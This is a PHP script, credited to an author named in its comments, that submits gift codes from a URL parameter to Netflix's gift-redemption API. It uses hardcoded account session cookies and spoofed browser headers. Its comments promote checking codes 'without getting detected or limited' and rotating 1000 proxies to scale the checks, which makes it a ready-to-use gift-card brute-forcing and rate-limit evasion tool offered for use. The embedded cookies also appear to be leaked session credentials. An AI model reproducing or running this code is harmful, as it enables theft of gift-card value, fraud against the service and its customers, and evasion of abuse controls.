<?php
//Coded by MixBanana.
//Linkedin profile: https://www.linkedin.com/in/sahar-shlichove-%D7%A1%D7%94%D7%A8-%D7%A9%D7%9C%D7%99%D7%97%D7%95%D7%91-854579185/

$code = $_GET["code"];
$proxies = $_GET["proxy"];
//Link: checker.php?code=$code&proxy=$proxies

$ch = curl_init();
//Send "GET" request to Netflix API:
curl_setopt($ch, CURLOPT_URL, "https://www.netflix.com/api/shakti/v6faf08f4/account/giftredeem?giftCode=$code&authURL=1554135131500.gaVxwWwuijToMfylu7ZuXZVni9A^%^3D^=1546698462014");

//We can check a gift card every 10 seconds without getting detected or limited.
//For fast results, I offer to use proxies, for example 1000 proxies will run 1000 checks every 10 seconds without getting detected.
//curl_setopt($ch, CURLOPT_PROXY, "$proxies");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, '<user>:<pass>'); //proxy auth
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); //CURLPROXY_SOCKS5 CURLPROXY_SOCKS4 CURLPROXY_HTTP
//curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Pragma: no-cache';
$headers[] = 'Dnt: 1';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: en-US,en;q=0.9,he;q=0.8';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Cookie: flwssn=4dceefef-02c9-4801-a197-8f0bdc213c51; clSharedContext=f9996e99-e4e2-43c2-be4e-7a0403bc67c2; memclid=c2430d93-7c57-4b09-92f7-60c99a1efbd8; SecureNetflixId=v%3D2%26mac%3DAQEAEQABABRbxTcllEGX9m5d9yhJIpbWrTyKqr-HThU.%26dt%3D1546698467854; nfvdid=BQFmAAEBEJq%2FRxjjzt2%2B89qas84i3xVgVedXMEqJEn4yVmfwBB6zcWncjWw000%2F2wk7Hzu3DdWWaL3lvgO8DWy5pyDLbxOhUvnoYjugySJTzTg62DeHMfMPHJS2uCYO%2F55RgNNH1qhfDhv2%2FAgyIA3BPWQUwtePx; NetflixId=v%3D2%26ct%3DBQAOAAEBEMALgLwMmJ0g0CTtYwSCsemBwMTbuJK3wqaSZ4SD2ewEvR56LGPZUxCV-7BKUbak8DV6AnXJlUsiaorxfOJWvMXq8wsjPGGIfin5f0IMW_BTT4N4fIlFDmplokPUdSDM4amY1it_8h0LBWVyQe8v5zseZjiB7n_HW_4DRiAVDCq0JfN9gQfIFyPdZBJ-PUFMDqjQnR76pHGUik__oRpvFX_bZftGx8uRiMr8g7WXvIlZbs59HZmktRZofo05yi8EN4D6BNxlSO07JNJxslEmVmH1DvDUPgKttSzt-bUwRCKJ_Lvn_ff5lfoTkbXxXBkW6ndJwOCGinfXknaXMUya_C7sN5pLgwAfb3vwaXp7bDmK9OoC4tU81xsMvyZNLaycDbMQUvcd1jTX2o1__cMVXxidelue3HVi0FDYCq41OT5H9y-imRIiuhZrVbSrwAPqHvFpMu1fkaJ8cAUSTMIkZ0ByyvSRH6xxhSyrdGiZ5mPl7k13PQ645qL5iuR9kyI14-LpeZw2utJAh4azF91iyHF85GQDoghg3Nr5xLNENSUo-U_E2GOGL-PUNQt0plCmL-ShDa8J_pN-g9RAIKbWIhF13Qu6CjnMr2V3tp6dRMpV9Eo.%26bt%3Ddbl%26ch%3DAQEAEAABABSBSRkvIIVa6IbUwUS8Zt7-0SwJwegZI5w.%26mac%3DAQEAEAABABQYqzqAt63aRXP9tpAvfNJlwszLIshH2KQ.; lhpuuidh-browse-AMTX6B32A5D5TET6BROVZC4234=GB%3AHE-US%3Ae4aaa5f0-500f-4bc6-9f27-c76b5bce0273_ROOT; lhpuuidh-browse-AMTX6B32A5D5TET6BROVZC4234-T=1546698474325; profilesNewSession=0; cL=1546698461999%7C154669846174841221%7C154669846151126377%7C%7C4%7CAMTX6B32A5D5TET6BROVZC4234; VisitorId=002~c2430d93-7c57-4b09-92f7-60c99a1efbd8~1546698497290~true~1546698498129~';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.netflix.com/YourAccount';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
echo $result;

if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);
?>
